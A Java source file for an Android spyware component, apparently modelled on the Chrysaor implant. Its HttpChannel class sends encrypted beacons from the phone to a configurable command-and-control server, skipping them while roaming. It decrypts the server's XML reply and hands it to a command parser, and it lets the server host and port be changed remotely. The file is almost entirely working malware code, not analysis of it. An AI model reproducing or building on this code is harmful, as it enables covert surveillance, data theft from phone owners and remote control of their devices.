package com.android.chrysaoralike;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class HttpChannel {
    private static final String TAG = "HttpChannel";
    private Context context;
    private HttpRequestBuilder requestBuilder;
    private boolean roamingAllowed = true;
    private String token;
    private HttpCommandParser commandParser;

    public HttpChannel(Context context) {
        this.context = context.getApplicationContext();
        this.requestBuilder = new HttpRequestBuilder(context);
        this.commandParser = new HttpCommandParser();
        this.token = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).getString("token", "myToken123");
        this.roamingAllowed = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).getBoolean("allow_roaming_http", true);
    }

    public boolean sendBeacon() {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        boolean isRoaming = tm != null && tm.isNetworkRoaming();
        if (isRoaming && !roamingAllowed) {
            Log.i(TAG, "Roaming and not allowed – skipping HTTP beacon.");
            return false;
        }
        HttpURLConnection conn = null;
        try {
            String urlString = requestBuilder.getUrl();
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);

            String sessionId1 = HttpCrypto.makeSessionId1(token);
            String sessionId2 = HttpCrypto.makeSessionId2(requestBuilder.getSessionKey());
            conn.setRequestProperty("SessionId1", sessionId1);
            conn.setRequestProperty("SessionId2", sessionId2);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=__ANDROID_BOUNDARY__");
            conn.setRequestProperty("Connection", "Keep-Alive");

            byte[] body = requestBuilder.buildRequestBody();
            if (body == null) { Log.e(TAG, "Failed to build request body."); return false; }
            conn.setFixedLengthStreamingMode(body.length);
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(body);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.i(TAG, "HTTP response code: " + responseCode);
            if (responseCode == 200) {
                InputStream is = conn.getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];
                int read;
                while ((read = is.read(buffer)) != -1) baos.write(buffer, 0, read);
                is.close();
                byte[] encryptedResponse = baos.toByteArray();
                Log.i(TAG, "Received encrypted response size: " + encryptedResponse.length + " bytes");
                String decryptedXml = HttpCrypto.serverResponseDecrypt(encryptedResponse, token);
                if (decryptedXml == null) { Log.e(TAG, "Failed to decrypt server response."); return false; }
                Log.i(TAG, "Decrypted response XML: " + decryptedXml);
                commandParser.parse(decryptedXml);
                return true;
            } else {
                InputStream es = conn.getErrorStream();
                if (es != null) { ByteArrayOutputStream baosErr = new ByteArrayOutputStream(); byte[] buf = new byte[1024]; int r; while ((r = es.read(buf)) != -1) baosErr.write(buf, 0, r); Log.e(TAG, "HTTP error body: " + baosErr.toString("UTF-8")); es.close(); }
                return false;
            }
        } catch (Exception e) {
            Log.e(TAG, "HTTP channel error", e);
            return false;
        } finally { if (conn != null) conn.disconnect(); }
    }

    public void setRoamingAllowed(boolean allowed) { this.roamingAllowed = allowed; context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).edit().putBoolean("allow_roaming_http", allowed).apply(); }
    public void updateServer(String host, int port) { requestBuilder.setServerHost(host); requestBuilder.setServerPort(port); }
}